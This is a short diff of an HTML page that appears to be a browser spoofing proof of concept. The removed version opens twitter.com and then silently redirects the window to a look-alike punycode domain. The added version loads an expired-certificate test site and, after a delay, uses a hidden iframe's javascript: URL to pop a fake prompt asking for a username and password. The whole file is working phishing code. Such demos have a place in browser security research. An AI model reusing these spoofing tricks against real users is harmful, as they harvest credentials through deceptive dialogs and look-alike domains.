@@ -1,15 +1,14 @@
+<html>
+  <body>
+    <script>
+    function pwn() {
+        win = window.open('https://expired.badssl.com', '_self')
+        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
+    }
+    </script>
 
-<script>
-  function next() {
-         w.location.replace('https://thisis.NotGoogle.Com.login.google.com.xn--ngbof4hb.xn--ngbc5azd/');
-        }
+    <iframe style="display:none" id="nop" src=""></iframe>
 
-  function f() {
-    w = window.open("");
-    w.document.write('<h2>This is not twitter.com!</h2>');
-    w.location = "https://twitter.com";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
-</script>
-
-<a href="#" onclick="f()">Login Twitter</a>
+    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
+  </body>
+</html>
